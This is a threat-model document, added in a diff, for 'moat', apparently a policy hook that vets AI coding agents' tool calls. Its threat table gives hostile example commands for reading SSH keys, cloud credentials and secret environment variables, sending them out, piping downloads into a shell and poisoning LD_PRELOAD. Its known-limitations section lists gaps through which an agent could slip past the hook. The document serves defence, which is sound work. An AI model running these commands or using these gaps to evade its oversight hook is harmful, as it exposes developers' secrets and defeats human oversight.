@@ -1,0 +1,133 @@
+# Threat model
+
+What `moat` defends, against whom, how well the current code does it, and where it
+does not. The alpha is decide-only (ADR-013): every statement below about the alpha
+is about a policy decision, not about what the operating system prevents.
+Per-threat test counts are in [COVERAGE.md](COVERAGE.md), generated from the
+conformance fixtures.
+
+## 1. Assets
+
+| # | Asset |
+|---|---|
+| A1 | Secrets on the machine: SSH keys, cloud credentials, tokens in the environment and in `.env` files, keychains |
+| A2 | Source code and git history |
+| A3 | Supply-chain position: publishing packages, pushing to CI, editing workflows |
+| A4 | The developer's identity and reach: GitHub, cloud consoles |
+| A5 | The kernel itself: policy, lock, hook configuration, the `moat` binary, the audit log |
+
+## 2. Attacker
+
+The attacker controls any text the agent reads: files, READMEs, issue titles, pull
+request bodies, web pages, MCP tool descriptions and results, dependencies. The
+attacker can publish packages and MCP servers. The attacker does not have root or
+the user's shell on the machine. The model is treated as untrusted: its tool calls
+are requests, and a hallucinated destructive command is handled the same way as an
+injected one.
+
+Trust zones:
+
+| Zone | Trust |
+|---|---|
+| `moat` binary and the policy, after the lock check | trusted |
+| The host (agent process and its hook plumbing) | semi-trusted: assumed to call the hook honestly, may be fail-open |
+| The model's tool calls | untrusted |
+| Commands, MCP servers, project scripts | untrusted |
+| Policy and hook files | integrity-checked on every call |
+
+## 3. Threat classes
+
+"Alpha" is what the default policy and the kernel do today. "Beta" is the planned
+answer from the [roadmap](ROADMAP.md).
+
+| # | Class | Alpha (decide-only) | Beta |
+|---|---|---|---|
+| T1 | Secret exfiltration via shell (`curl -d @~/.ssh/id_rsa …`) | `secrets-paths` denies reads and writes of secret paths, also through `cd`, relative operands, `~name`, symlinks and nested shells; unlisted hosts are denied by `default.net` | Sandbox with no read access to secret paths and no direct network |
+| T2 | Secret exfiltration via file tools (`Read ~/.aws/credentials`) | The same path rules for Claude Code `Read`/`Glob`/`Grep`/`LSP`, Cursor `beforeReadFile` and `preToolUse` `Read`/`Grep`/`Glob`, and MCP path arguments | Same, plus the sandbox |
+| T3 | Secret exfiltration via the environment (`echo $OPENAI_API_KEY`, `env`) | `env-secrets` denies reads of secret-shaped names; `env-dump` denies argument-less `env`, `printenv`, `set`, `export`, `declare`, `typeset` | Scrubbed environment |
+| T4 | Destructive git and filesystem operations | `destructive` denies force pushes in every spelling, remote branch deletion, `reset --hard`, `clean -fdx`, `branch -D`, `stash drop/clear`, `rm -rf` of `/` and `~`, `sudo`, `mkfs`, `dd if=`; recursive `rm` and discarding checkouts ask | Same |
+| T5 | Supply-chain execution (`curl … \| sh`, unknown installs) | `pipe-to-shell` denies downloads and decoded streams piped into a shell or interpreter, and `eval`; `installs` asks for package installs | Network limited to registries inside the sandbox |
+| T6 | Environment poisoning (`PATH`, `LD_PRELOAD`, planted binaries) | `env-poison` denies setting dangerous variables; executable pins deny a program that resolves somewhere else than recorded (ADR-008) | Kernel-controlled environment for every command |
+| T7 | Obfuscation and nested execution (`bash -c`, `eval`, `$( … )`, here-documents, decoders) | Recursive classification to depth 4; decoder pipelines are canonicalised; anything unclear is `unparseable` and asks | Enforcement on the process, so spelling no longer matters |
+| T8 | MCP tool poisoning, over-privileged MCP tools | `mcp` rules on tool names; path and URL arguments become `fs.*` and `net` atoms; unreadable arguments deny | MCP stdio proxy with description pinning (1.0) |
+| T9 | Hook and policy tampering by the agent | `kernel-self` denies writes to state, host directories, hook files, and agent runs of `moat allow\|doctor\|init\|policy`; the lock denies everything after drift; Claude Code `ConfigChange` blocks a drifted settings file | Signed policy (1.0) |
+| T10 | Hook supply chain (a trojaned hook binary) | Hooks are exec-form with an absolute, stable path (ADR-016); `kernel-self` denies writes to any `bin/moat`; `doctor` names a missing or different hook binary | Signed releases |
+| T11 | Time of check vs. time of use, symlinks | Literal and resolved paths are both checked (ADR-009) | Sandbox path rules apply at use |
+| T12 | Network to unknown hosts | `default.net` denies shell network to unlisted hosts; `cloud-metadata` denies metadata and link-local services; `local-net` asks for localhost; `WebFetch` of an unlisted host asks (ADR-017) | Egress proxy and session taint |
+
+## 4. Out of scope
+
+- An attacker with root, or with the user's own shell outside the agent.
+- A malicious `moat` binary from a compromised release pipeline (signed releases and
+  provenance are planned with the release workflow, #89).
+- Attacks on the model provider, and agents that run in a vendor's cloud.
+- Prompt-injection detection in text. `moat` governs actions, not intent.
+
+## 5. Known limitations
+
+These hold for the current code. Each is a design consequence or a tracked gap, not
+something the alpha claims to stop.
+
+- **Decide-only.** Nothing is enforced by the operating system. An allowed command
+  runs with the user's full permissions. A classifier mistake, an option the
+  exclusion lists miss, or a program that runs other programs is a bypass, and in
+  scope as a vulnerability ([SECURITY.md](../SECURITY.md)).
+- **Project scripts run arbitrary code.** `npm test`, `npm run *`, `cargo test`,
+  `cargo run`, `make test`, `pytest` and similar are allowed by `dev-shell`. They run
+  whatever the project's scripts, build files and test files say, and `moat` sees
+  only the command line. An agent that can write into the project can therefore run
+  any code through an allowed command. OS enforcement is the answer.
+- **Allowed hosts are relays.** `registries` allows network to `api.github.com`,
+  `github.com` and the package registries. The host check passes for any command
+  that reaches them, so a command that is itself allowed (a project script) or that
+  a person approves at the prompt (`curl -X POST https://api.github.com/gists -d
+  @file` asks on its `shell` atom only) can send data there. A `WebFetch` GET can
+  carry data in its URL; the prompt shows the URL. Session taint (#127) is planned to
+  make network ask after a secret read.
+- **Hosts proceed when the hook binary is missing.** Claude Code and Codex treat a
+  hook that cannot start as a non-blocking error and run the tool call. Cursor blocks
+  because `moat init` sets `failClosed`. `moat status` and `moat doctor` report a
+  missing hook binary.
+- **Ungoverned tools.** Claude Code `WebSearch` (server-side), `SendFile` (#137) and
+  orchestration tools whose own calls are hooked; Codex web search and hosted tools;
+  Cursor `Shell` under `preToolUse` (governed by `beforeShellExecution` instead). Ungoverned calls are
+  allowed with rule `ungoverned` and recorded.
+- **No settings veto outside Claude Code.** Codex and Cursor have no `ConfigChange`
+  event, so a tampered hook file there is caught on the next tool call, not when it
+  is written.
+- **PowerShell is not parsed.** Claude Code `PowerShell` always asks. A PowerShell
+  line given to a POSIX shell tool is lexed as POSIX and usually falls through to the
+  `ask` default.
+- **Pattern lists are incomplete by nature.** Pseudo-terminal routes to `moat allow`
+  (ADR-011, ADR-014), environment dumps through interpreters (`python -c
+  'print(os.environ)'`, ADR-010), and options that run programs (ADR-012) are matched
+  by lists. Spellings outside the lists ask or, if a broad allow covers them, are
+  allowed.
+- **TOCTOU and hard links.** A link swapped between the check and the command
+  running, and hard links, are not seen (ADR-009).
+- **The terminal check is not a boundary.** `moat allow` and `moat doctor --accept`
+  check for a TTY. The `kernel-self` rules and the lock are what stop an agent from
+  re-pinning or granting itself anything.
+- **The binary is pinned by path, not digest** (ADR-006, ADR-016). Whoever can replace
+  the file the stable link points at decides what the hooks run.
+- **`CLAUDE_CONFIG_DIR` must match.** `moat init`, `status`, `doctor` and `allow` look
+  for Claude Code's settings in the directory their own environment names. Re-pinning
+  from a shell with a different `CLAUDE_CONFIG_DIR` drops that hook file from the
+  lock.
+
+## 6. How the claims are tested
+
+- **Conformance suite.** `tests/conformance/{attacks,benign,ask}.yaml`: one tool
+  call per fixture, with the verdict and rule ids the default policy must give. Every
+  attack and ask fixture names its threat class, every class needs at least one
+  attack fixture, and [COVERAGE.md](COVERAGE.md) is generated from them. Every valid
+  bypass becomes a fixture before its fix is published.
+- **End-to-end tests** run the real binary as a hook in isolated homes: lock drift,
+  `ConfigChange`, approvals, install paths, every host's payloads.
+- **Fuzzing.** `cargo fuzz` targets for the shell path through the engine, policy
+  parsing, host payloads and `moat allow --always` patterns run in CI on every pull
+  request and weekly.
+- **Planned:** differential testing of the lexer against real `bash`, executing
+  fixtures under OS enforcement, and MoatBench, which measures attack success with and
+  without `moat` across agents ([ROADMAP.md](ROADMAP.md)). Prompt fatigue is measured
+  today only by `moat report` (asks per active hour).
